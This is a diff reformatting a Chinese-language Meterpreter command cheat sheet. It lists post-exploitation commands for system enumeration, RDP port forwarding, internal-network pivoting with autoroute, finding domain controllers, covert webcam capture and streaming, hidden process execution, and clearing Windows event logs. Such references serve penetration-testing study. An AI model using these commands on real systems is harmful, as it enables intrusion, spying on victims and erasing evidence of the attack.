@@ -7,8 +7,9 @@ tags: [meterpreter]
 description: meterpreter操作命令大全
 ---
 
-######基本命令
->`getuid`查看权限
+###### 基本命令
+```
+`getuid`查看权限
 `sysinfo`查看系统信息
 `ipconfig`
 `netstat -ano`
@@ -31,9 +32,13 @@ description: meterpreter操作命令大全
 `lpwd`查看本地目录
 `lls`
 `lcd`
-######端口转发
->`portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口`
-######内网扫描
+```
+###### 端口转发
+```
+`portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口`
+```
+###### 内网扫描
+```
 >autoroute添加路由
 >`run autoroute -s 192.168.17.0/24`添加到目标环境网络
 >`run autoroute –p`查看添加的路由
@@ -46,15 +51,22 @@ description: meterpreter操作命令大全
 >`run post/windows/gather/enum_applications`查看安装软件信息
 >`run post/windows/gather/enum_patches`查看补丁
 >`run post/windows/gather/enum_domain`查找域控
-######webcam
+```
+###### webcam
+```
 >`webcam_list`查看摄像头
 `webcam_snap`拍照
 `webcam_stream`摄像头直播
-######执行文件
+```
+###### 执行文件
+```
 >`execute -H -i -f cmd.exe ` 创建新进程cmd.exe，-H不可见，-i交互
 `execute -f notepad.exe`
-####清除日志
+```
+#### 清除日志
+```
 >`clearav `清除windows中的应用程序日志、系统日志、安全日志
+```
 
 
 
